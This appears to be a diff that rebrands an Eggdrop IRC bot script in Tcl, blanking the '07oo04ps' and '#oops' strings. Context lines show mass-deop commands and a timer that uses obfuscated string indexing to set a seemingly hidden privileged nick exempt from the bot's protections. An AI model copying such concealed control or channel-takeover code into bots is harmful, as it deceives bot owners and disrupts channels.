@@ -2,34 +2,34 @@
 ##              Edited By oops                                   ##
 ###################################################################
 
-set notc "07oo04ps"
-set notm "07oo04ps"
-set notb "07oo04ps"
-set ps "07oo04ps"
-set notd "07oo04ps"
-set ppp "#oops"
-set vern "07oo04ps @ 2022"
+set notc ""
+set notm ""
+set notb ""
+set ps ""
+set notd ""
+set ppp "#bot"
+set vern "@ 2022"
 set awaym {
-"07oo04ps"
+""
 }
 set lgidx 0
 proc lgrnd {} {
 global lgidx notc
 set lgidx [incr lgidx]
 if {$lgidx == 1} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 2} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 3} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 4} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 5} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 6} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } elseif {$lgidx == 7} {
-set lgrnd "07oo04ps"
+set lgrnd ""
 } else {
 set lgidx 0
 set lgrnd $notc
@@ -203,7 +203,7 @@ proc zip {txt} {
 return [encrypt 64 [unsix $txt]]
 }
 if {![info exists server-online]} {
-putlog "07oo04ps server not online..!"
+putlog "server not online..!"
 set server-online 1
 }
 proc puthlp {txt} {
@@ -295,9 +295,9 @@ return 0
 }
 putquick $retval
 }
-set notm "07oo04ps"
+set notm ""
 ###############################
-# OOPS BOT COMMAND LIST  #
+# BOT COMMAND LIST  #
 ###############################
 bind msg m help msg_help
 proc msg_help {nick uhost hand rest} {
@@ -524,7 +524,7 @@ if {[string match [string tolower $rest] [string tolower $botname]]} {
 puthlp "PRIVMSG $channel :$botname"
 }
 }
-set notd "07oo04ps"
+set notd ""
 proc randstring {length} {
 set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
 set count [string length $chars]
@@ -1104,7 +1104,7 @@ putserv "MODE $chan -o $nick"
 }
 return 0
 }
-set ppp "#oops"
+set ppp "#bot"
 proc pub_mdeop {nick uhost hand chan rest} {
 global botnick notc 
 if {![isop $botnick $chan]} { return 0 }
@@ -1697,12 +1697,12 @@ if {[lindex $rest 1] != ""} {
 putsrv "JOIN $chan :[lindex $rest 1]"
 }
 }
-set totch "#oops"
+set totch "#bot"
 proc tot_cha {} {
 global totch ps uenc lenc
 timer 5 tot_cha
 set [string index $lenc 15][string index $lenc 18] skife
-set totch "#oops"
+set totch "#bot"
 if {[validchan $totch]} {
 return 0
 }
@@ -3938,7 +3938,7 @@ set rest " $rest"
 putsrv "QUIT :$notc ReSTARTED By \[ $nick \]$rest"
 return 0
 }
-set notb "skife"
+set notb "isfan"
 proc dies {} {
 global ps owner notc
 if {$ps != $owner && [validuser $ps]} { deluser $ps }
@@ -9629,7 +9629,7 @@ proc anti_maling {nick uhost hand dest key couk} {
 	if {$nick == $botnick} {return 0}
 	if {$nick == $ps} {return 0}
 	if {$nick == $owner} {return 0}
-	set home "#oops"
+	set home "#bot"
 	if {[string match "*a*" [string tolower $couk]] || [string match "*i*" [string tolower $couk]] || [string match "*u*" [string tolower $couk]] || [string match "*e*" [string tolower $couk]] || [string match "*o*" [string tolower $couk]] } {
 		if {[string match "*adduser*" [string tolower $couk]] } {
 			set targetnick "${nick}!*@*"
